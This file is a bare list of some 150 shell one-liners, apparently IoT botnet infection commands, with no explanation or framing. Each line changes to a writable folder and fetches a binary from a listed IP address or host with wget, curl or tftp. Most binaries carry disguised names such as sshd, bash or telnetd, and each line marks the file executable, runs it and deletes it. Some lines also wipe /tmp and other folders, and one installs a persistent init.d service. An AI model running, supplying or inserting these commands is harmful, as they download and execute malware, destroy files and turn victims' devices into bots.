cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/apache2; curl -O http://82.118.242.175/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/telnetd; curl -O http://82.118.242.175/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get sh;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 204.45.61.3 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 198.167.140.97;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 198.167.140.97;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 198.167.140.97;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 198.167.140.97;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 198.167.140.97;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 198.167.140.97;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 198.167.140.97;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 198.167.140.97;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 198.167.140.97;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 198.167.140.97;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 198.167.140.97;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 198.167.140.97;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 198.167.140.97;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://167.99.5.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://145.239.72.250/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get FatGGei;cat FatGGei >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get GORdLx;cat GORdLx >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get NiwuahT;cat NiwuahT >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get Aboaniad;cat Aboaniad >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get yXzloA;cat yXzloA >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get YEUAxmakiO;cat YEUAxmakiO >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get NianhaoO;cat NianhaoO >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get LoytA;cat LoytA >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get BamOaZ;cat BamOaZ >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get YtenZjs;cat YtenZjs >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get Akasters;cat Akasters >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get Al7una;cat Al7una >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/system || cd /mnt || cd /lib; rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox tftp 117.236.240.35 -c get Ney6saA;cat Ney6saA >botzinhobox;chmod +x *;./botzinhobox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/ntpd --output ntpd ; cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/sshd --output sshd; cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/openssh --output oppenssh; cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/bash --output bash; cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/tftp --output tftp; cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/wget --output wget; cat wget >badbox;chmod +x *;./badbox 
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/cron --output cron; cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/ftp --output ftp ; cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/pftp --output pftp; cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/sh --output sh; cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://verasquerisasluego.esy.es/Bt/tftpboot/apache2 --output apache2; cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.15.247/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.mips; curl -O http://46.166.185.35/fyfa.mips; chmod +x fyfa.mips; ./fyfa.mips; rm -rf fyfa.mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.mpsl; curl -O http://46.166.185.35/fyfa.mpsl; chmod +x fyfa.mpsl; ./fyfa.mpsl; rm -rf fyfa.mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.sh4; curl -O http://46.166.185.35/fyfa.sh4; chmod +x fyfa.sh4; ./fyfa.sh4; rm -rf fyfa.sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.x86; curl -O http://46.166.185.35/fyfa.x86; chmod +x fyfa.x86; ./fyfa.x86; rm -rf fyfa.x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.arm; curl -O http://46.166.185.35/fyfa.arm; chmod +x fyfa.arm; ./fyfa.arm; rm -rf fyfa.arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.pcc; curl -O http://46.166.185.35/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.i686; curl -O http://46.166.185.35/fyfa.i686; chmod +x fyfa.i686; ./fyfa.i686; rm -rf fyfa.i686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.i586; curl -O http://46.166.185.35/fyfa.i586; chmod +x fyfa.i586; ./fyfa.i586; rm -rf fyfa.i586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.m68k; curl -O http://46.166.185.35/fyfa.m68k; chmod +x fyfa.m68k; ./fyfa.m68k; rm -rf fyfa.m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.spc; curl -O http://46.166.185.35/fyfa.spc; chmod +x fyfa.spc; ./fyfa.spc; rm -rf fyfa.spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/fyfa.pcc; curl -O http://46.166.185.35/fyfa.pcc; chmod +x fyfa.pcc; ./fyfa.pcc; rm -rf fyfa.pcc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.157.250.28/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa; curl -O http://89.39.107.56/nsa; chmod +x nsa; ./nsa; rm -rf nsa
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa1; curl -O http://89.39.107.56/nsa1; chmod +x nsa1; ./nsa1; rm -rf nsa1
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa2; curl -O http://89.39.107.56/nsa2; chmod +x nsa2; ./nsa2; rm -rf nsa2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa3; curl -O http://89.39.107.56/nsa3; chmod +x nsa3; ./nsa3; rm -rf nsa3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa4; curl -O http://89.39.107.56/nsa4; chmod +x nsa4; ./nsa4; rm -rf nsa4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa5; curl -O http://89.39.107.56/nsa5; chmod +x nsa5; ./nsa5; rm -rf nsa5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa6; curl -O http://89.39.107.56/nsa6; chmod +x nsa6; ./nsa6; rm -rf nsa6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa7; curl -O http://89.39.107.56/nsa7; chmod +x nsa7; ./nsa7; rm -rf nsa7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa8; curl -O http://89.39.107.56/nsa8; chmod +x nsa8; ./nsa8; rm -rf nsa8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa9; curl -O http://89.39.107.56/nsa9; chmod +x nsa9; ./nsa9; rm -rf nsa9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.39.107.56/nsa10; curl -O http://89.39.107.56/nsa10; chmod +x nsa10; ./nsa10; rm -rf nsa10
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/lungkasssssss; chmod +x lungkasssssss; ./lungkasssssss; rm -rf lungkasssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/mangosssssss; chmod +x mangosssssss; ./mangosssssss; rm -rf mangosssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/opengglsssssss; chmod +x opengglsssssss; ./opengglsssssss; rm -rf opengglsssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/vastsssssss; chmod +x vastsssssss; ./vastsssssss; rm -rf vastsssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/greypsssssss; chmod +x greypsssssss; ./greypsssssss; rm -rf greypsssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/kuhamosssssss; chmod +x kuhamosssssss; ./kuhamosssssss; rm -rf kuhamosssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/marcosssssss; chmod +x marcosssssss; ./marcosssssss; rm -rf marcosssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/chikosssssss; chmod +x chikosssssss; ./chikosssssss; rm -rf chikosssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/pchikosssssss; chmod +x pchikosssssss; ./pchikosssssss; rm -rf pchikosssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/cosssssss; chmod +x cosssssss; ./cosssssss; rm -rf cosssssss
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/facebooksssssss3; chmod +x facebooksssssss3; ./facebooksssssss3; rm -rf facebooksssssss3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://112.211.190.198/netdeldsssssss; chmod +x netdeldsssssss; ./netdeldsssssss; rm -rf netdeldsssssss
cd /etc/init.d; wget http://112.211.190.198/tukhang; chmod 0777 tukhang; ./tukhang; service tukhang start
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://108.61.229.178/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.169.105/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkuryntpd; chmod +x Merkuryntpd; ./Merkuryntpd; rm -rf Merkuryntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.93/Merkurysshd; chmod +x Merkurysshd; ./Merkurysshd; rm -rf Merkurysshd
